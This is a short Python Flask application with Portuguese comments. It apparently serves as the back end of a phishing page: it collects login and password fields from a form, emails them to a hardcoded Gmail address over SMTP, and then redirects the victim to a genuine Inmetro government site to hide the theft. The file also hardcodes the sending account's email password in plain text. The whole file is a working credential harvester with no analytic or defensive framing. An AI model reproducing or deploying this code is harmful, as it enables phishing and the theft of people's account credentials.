from flask import Flask, render_template, request, redirect
from flask_mail import Mail, Message

app = Flask(__name__)

mail = 'ads.juan2017@gmail.com'
pwd = '30452560'

mail_settings = {
  "MAIL_SERVER": 'smtp.gmail.com',  # Servidor SMTP do seu provedor de email
  "MAIL_PORT": 465,  # Porta SMTP
  "MAIL_USE_SSL": True,  # Habilitar SSL
  "MAIL_USE_TLS": False,  # Habilitar TLS
  "MAIL_USERNAME": mail,  # Seu endereço de email
  "MAIL_PASSWORD": pwd  # Sua senha de email
}

app.config.update(mail_settings)
mail = Mail(app)

class Dados:
   def __init__(self, login, senha):
      self.login = login
      self.senha = senha


@app.route('/')
def index():
  return render_template('index.html')


@app.route('/', methods=['POST'])
def login():
    if request.method == 'POST':
      formDados = Dados(
         request.form['Login'], 
         request.form['Password']
        )
      

      # Enviar um email com os dados de login e senha
      msg = Message(
         subject= f'Novo login e senha de {formDados.login}', 
         sender='ads.juan2017@gmail.com', 
         recipients=['ads.juan2017@gmail.com'],
         body= f'''

          Login: {formDados.login}
          Senha: {formDados.senha}
          
          '''
      )

      mail.send(msg)
      app.logger.info('Login e senha enviados com sucesso!')
      
      # Redirecionar para um site após a inserção no banco de dados
      return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')

if __name__ == '__main__':
  app.run(port=5000)
